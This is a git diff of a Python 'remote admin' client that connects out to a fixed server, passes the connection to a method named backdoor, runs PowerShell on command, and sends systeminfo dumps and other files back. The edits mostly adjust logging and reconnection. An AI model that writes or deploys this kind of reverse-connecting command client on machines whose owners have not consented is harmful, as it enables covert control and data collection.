@@ -1,5 +1,6 @@
 from datetime import datetime
 from threading import Thread
+from termcolor import colored
 import subprocess
 import threading
 import random
@@ -10,8 +11,7 @@ import time
 import sys
 import os
 
-# DONE: Fixes Screenshot file receive
-# TODO: Fix systeminfo file receive
+# DONE: Fixed file transfers & Restart confirmation
 
 
 class Client:
@@ -28,41 +28,18 @@ class Client:
         if not os.path.exists(f'{self.main_path}'):
             os.makedirs(self.main_path)
 
-    def sc_conn(self, path, filename):
-        try:
-            sc_soc.send(f"{filename}".encode())
-            msg = soc.recv(1024).decode()
-            print(msg)
-
-            chunk = 40960000
-            sc = open(filename, 'rb')
-            while True:
-                data = sc.read(chunk)
-                if not data:
-                    break
-
-                sc_soc.sendall(data)
-
-            sc.close()
-            # sc_soc.close()
-
-            return True
-
-        except (ConnectionResetError, ConnectionError, ConnectionAbortedError, ConnectionRefusedError):
-            return False
-
     def connection(self):
-        soc = socket.socket()
-        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        # soc = socket.socket()
+        # soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
         while True:
             time.sleep(1)
-            # print(colored(f"[i]Connecting to Server: {self.server_host} | Port {self.server_port}...", 'cyan'))
+            print(colored(f"[i]Connecting to Server: {self.server_host} | Port {self.server_port}...", 'cyan'))
             try:
                 soc.connect((self.server_host, self.server_port))
 
             except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError) as e:
-                # print(colored(e, 'red'))
+                print(colored(e, 'red'))
                 continue
 
     def anydesk(self):
@@ -81,8 +58,6 @@ class Client:
         return result
 
     def bytes_to_number(self, b):
-        # if Python2.x
-        # b = map(ord, b)
         res = 0
         for i in range(4):
             res += b[i] << (i * 8)
@@ -98,7 +73,7 @@ class Client:
 
         # Wait For Commands
         message = soc.recv(self.buffer_size).decode()
-        # print(f"{colored(message, 'green')}")
+        print(f"{colored(message, 'green')}")
 
         while True:
             try:
@@ -109,7 +84,7 @@ class Client:
 
             try:
                 if len(str(command)) == 0:
-                    # print(colored("[!]Disconnected!", 'red'))
+                    print(colored("[!]Disconnected!", 'red'))
                     break
 
                 # Vital Signs
@@ -146,7 +121,6 @@ class Client:
 
                     ps = subprocess.Popen(["powershell.exe", rf"{self.path}"], stdout=sys.stdout)
                     ps.communicate()
-                    # self.sc_conn(self.path, self.filename)
                     try:
                         # Send filename to server
                         soc.send(f"{self.filename}".encode())
@@ -182,7 +156,6 @@ class Client:
                     self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                     self.sifile = rf"c:\MekifRemoteAdmin\systeminfo {self.hostname} {str(self.localIP)} {self.dt}.txt"
 
-                    # self.boot_time(soc, systeminfofile)
                     sysinfo = open(self.sifile, 'w')
                     sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
                     sysinfo.write("\n")
@@ -202,7 +175,6 @@ class Client:
                     print(f"SysInfoFile Size: {length}")
                     soc.send(self.convert_to_bytes(length))
 
-                    # sysinfo = open(self.sifile, 'r')
                     try:
                         with open(self.sifile, 'rb') as sy_file:
                             sys_data = sy_file.read(1024)
@@ -315,17 +287,17 @@ class Client:
                 elif str(command.lower()) == "exit":
                     self.d = datetime.now().replace(microsecond=0)
                     self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
-                    # print(colored('[!]Connection closed by server.', 'yellow'))
-                    soc.shutdown(socket.SHUT_RDWR)
-                    soc.close()
-                    self.connection()
+                    print('[!]Connection closed by server.')
+                    soc.settimeout(1)
+                    # self.connection()
+                    break
 
                 continue
 
-            except Exception as err:
+            except (Exception, socket.error) as err:
                 self.connection()
 
-        self.connection()
+        # self.connection()
 
 
 def run_powershell(cmd):
@@ -367,8 +339,6 @@ if __name__ == "__main__":
     task_list = []
     mekif_path = r'c:\MekifRemoteAdmin'
     servers = [('192.168.1.10', 55400)]
-    soc = socket.socket()
-    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     # Start Client
     while True:
@@ -376,9 +346,19 @@ if __name__ == "__main__":
             client = Client(server, mekif_path)
             time.sleep(1)
             try:
+                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                 soc.connect(server)
+                client.backdoor(soc)
 
-            except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError) as e:
-                # print(colored(e, 'red'))
+            except socket.error as e:
+                print(e)
                 continue
-            client.backdoor(soc)
+
+                # soc.connect(server)
+                # continue
+
+        # soc.shutdown(socket.SHUT_RD)
+        soc = socket.socket()
+        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        soc.close()
